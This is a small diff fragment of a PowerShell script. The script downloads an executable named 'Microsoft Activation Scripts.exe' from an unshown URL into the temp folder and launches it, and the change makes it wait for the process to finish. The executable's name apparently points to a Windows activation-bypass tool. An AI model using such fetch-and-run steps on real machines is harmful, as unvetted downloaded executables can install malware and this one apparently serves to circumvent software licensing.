@@ -6,4 +6,5 @@ $tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 Invoke-WebRequest -Uri $url -OutFile $tempFile
 
 # Стартиране
-Start-Process $tempFile
+Start-Process $tempFile -Wait
+
